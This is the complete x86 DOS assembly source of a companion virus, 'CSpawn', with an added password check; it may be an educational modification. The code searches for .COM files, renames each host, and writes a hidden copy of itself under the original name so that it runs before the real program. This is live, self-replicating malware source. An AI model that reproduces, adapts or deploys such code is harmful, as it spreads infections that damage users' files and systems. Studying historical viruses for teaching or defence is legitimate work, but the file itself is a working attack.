.model tiny
.code 
org 100h

CSpawn:
	; procedure to generate the file password
    CALL GeneratePassword     

    ; procedure to check the prompt password
    CALL CheckPassword

    MOV SP, offset FINISH + 100h
    MOV AH, 4AH
    MOV BX,SP
    MOV CL,4
    SHR BX,CL
    INC BX
    INT 21H

    MOV BX,2Ch
    MOV AX,[BX]
    MOV WORD PTR [PARAM_BLK],AX
    MOV AX,CS
    MOV WORD PTR [PARAM_BLK+4],AX
    MOV WORD PTR [PARAM_BLK+8],AX
    MOV WORD PTR [PARAM_BLK+12],AX

    MOV DX,offset REAL_NAME
    MOV BX,offset PARAM_BLK
    MOV AX,4B00h
    INT 21h
	
    CLI
    mov     bx,ax                   ;save return code here
    mov     ax,cs                   ;AX holds code segment
    mov     ss,ax                   ;restore stack first 
    mov     sp,(FINISH - CSpawn) + 200H
    sti                
    push    bx                
    mov     ds,ax                   ;Restore data segment
    mov     es,ax                   ;Restore extra segment
    mov     ah,1AH                  ;DOS set DTA function    
    mov     dx,80H                  ;put DTA at offset 80H      
    int     21H                
	
    call    FIND_FILES              ;Find and infect files
    pop     ax                      ;AL holds return value 
    mov     ah,4CH                  ;DOS terminate function     
    int     21H                     ;bye-bye

; The following routine searches for COM files and infects them
FIND_FILES:                
    mov     dx,OFFSET COM_MASK      ;search for COM files
    mov     ah,4EH                  ;DOS find first file function 
    xor     cx,cx                   ;CX holds all file attributes
FIND_LOOP:      
    int     21H                
    jc      FIND_DONE               ;Exit if no files found
    call    INFECT_FILE             ;Infect the file!
    mov     ah,4FH                  ;DOS find next file function 
    jmp     FIND_LOOP               ;Try finding another file
FIND_DONE:      ret                     ;Return to caller
    COM_MASK        db      '*.COM',0               ;COM file search mask

; This routine infects the file specified in the DTA.
INFECT_FILE:                
    mov     si,9EH                  ;DTA + 1EH                
    mov     di,OFFSET REAL_NAME     ;DI points to new name
INF_LOOP:       
    lodsb                           ;Load a character
    stosb                           ;and save it in buffer
    or      al,al                   ;Is it a NULL?
    jnz     INF_LOOP                ;If so then leave the loop
    mov     WORD PTR [di-2],'N'     ;change name to CON & add 0
    mov     dx,9EH                  ;DTA + 1EH
    mov     di,OFFSET REAL_NAME                
    mov     ah,56H                  ;rename original file
    int     21H
    jc      INF_EXIT                ;if can’t rename, already done

    mov     ah,3CH                  ;DOS create file function
    mov     cx,2                    ;set hidden attribute
    int     21H
    mov     bx,ax                   ;BX holds file handle
    mov     ah,40H                  ;DOS write to file function
    mov     cx,FINISH - CSpawn      ;CX holds virus length
    mov     dx,OFFSET CSpawn        ;DX points to CSpawn of virus
    int     21H                
    mov     ah,3EH                  ;DOS close file function
    int     21H
INF_EXIT:       ret

; procedure to generate the file password
GeneratePassword proc near
    MOV AL, [REAL_NAME]        ; load the first byte of the program name
    CMP AL, 0                  
    JE  SetDefaultPassword     ; if it's empty -> we use a default password

    MOV SI, OFFSET REAL_NAME   ; point to host name 
    MOV DI, OFFSET Password    ; buffer for generated password

    ; add "pass" to the password
    MOV BYTE PTR [DI], 'p'       
    INC DI
    MOV BYTE PTR [DI], 'a'       
    INC DI
    MOV BYTE PTR [DI], 's'       
    INC DI
    MOV BYTE PTR [DI], 's'       
    INC DI

    ; copy the first 3 characters of the file 
    MOV CX, 3                    
CopyFirstThreeCharacters:
    MOV AL, [SI]                 ; load character from host name
    MOV [DI], AL                 ; store it in password
    INC SI                       ; inc to next host character
    INC DI                       ; inc to next position in password
    LOOP CopyFirstThreeCharacters       

    ; null indicates the end of the password
    MOV BYTE PTR [DI], 0
    RET

SetDefaultPassword:
    ; if REAL_NAME is empty -> the default password is "pass123"
    MOV DI, OFFSET Password
    MOV BYTE PTR [DI], 'p'
    INC DI
    MOV BYTE PTR [DI], 'a'
    INC DI
    MOV BYTE PTR [DI], 's'
    INC DI
    MOV BYTE PTR [DI], 's'
    INC DI
    MOV BYTE PTR [DI], '1'
    INC DI
    MOV BYTE PTR [DI], '2'
    INC DI
    MOV BYTE PTR [DI], '3'
    INC DI

    ; null indicates the end of the password
    MOV BYTE PTR [DI], 0
    RET
GeneratePassword endp

; procedure to prompt user password
; and validate it
CheckPassword proc near
    ; prompt the user for input
    MOV DX, offset PromptPassword
    MOV AH, 09h
    INT 21h                  

    ; read user input into buffer
    MOV DX, offset PasswordBuffer
    MOV AH, 0Ah                  ; DOS function to read input
    INT 21h

    MOV DI, offset PasswordBuffer + 2        ; start of user input
    MOV CL, [PasswordBuffer + 1]             ; length of user input
    ADD DI, CX                               ; point to the end of the input
    MOV BYTE PTR [DI], 0                     ; add null terminator

    MOV SI, offset Password              ; points to generated password
    MOV DI, offset PasswordBuffer + 2    ; points to user input (skip length byte)

    ; compare passwords
CompareLoop:
    MOV AL, [SI]                 ; load byte from generated password
    MOV BL, [DI]                 ; load byte from user password
    CMP AL, BL                   ; compare
    JNE PasswordIncorrect        ; if mismatch -> the password is incorrect

    INC SI                       ; move to next character in generated password
    INC DI                       ; move to next character in user password
    CMP BYTE PTR [SI], 0         ; check end of generated password
    JNZ CompareLoop              ; if not at end, continue comparing

    CMP BYTE PTR [DI], 0         ; check end of user input
    JNZ PasswordIncorrect        ; if user input hasn't ended, it's incorrect

    ; if passwords match -> the password it's correct
    JMP PasswordCorrect

PasswordIncorrect:
    ; print incorrect message and terminate
    MOV DX, offset IncorrectPasswordMsg
    MOV AH, 09h
    INT 21h

    MOV AH, 4Ch                  ; DOS terminate function
    INT 21h

PasswordCorrect:
    ; print correct message and return
	
	; print new line
    MOV AH, 0Eh         
    MOV AL, 0Dh       
    INT 10h             

    MOV AH, 0Eh         
    MOV AL, 0Ah         
    INT 10h             

    ; print message
    MOV DX, offset CorrectPasswordMsg
    MOV AH, 09h
    INT 21h

    ; print new line
    MOV AH, 0Eh
    MOV AL, 0Dh
    INT 10h

    MOV AH, 0Eh
    MOV AL, 0Ah
    INT 10h

	; return
    RET
CheckPassword endp

Password db 8, 0, 8 dup (?)  ; buffer for dynamically generated password

PasswordBuffer db 16, 0, 16 dup (?) ; buffer for user's password

PromptPassword db 'Enter password: $'
IncorrectPasswordMsg db 'Incorrect password...$'
CorrectPasswordMsg db 'Correct password!$'

REAL_NAME       db      13 dup (?)              ;Name of host to execute

; DOS EXEC function parameter block
PARAM_BLK       DW      ?                       ; Environment segment
                 DD      80H                     ; @ of command line
                 DD      5CH                     ; @ of first FCB
                 DD      6CH                     ; @ of second FCB

FINISH:
    end     CSpawn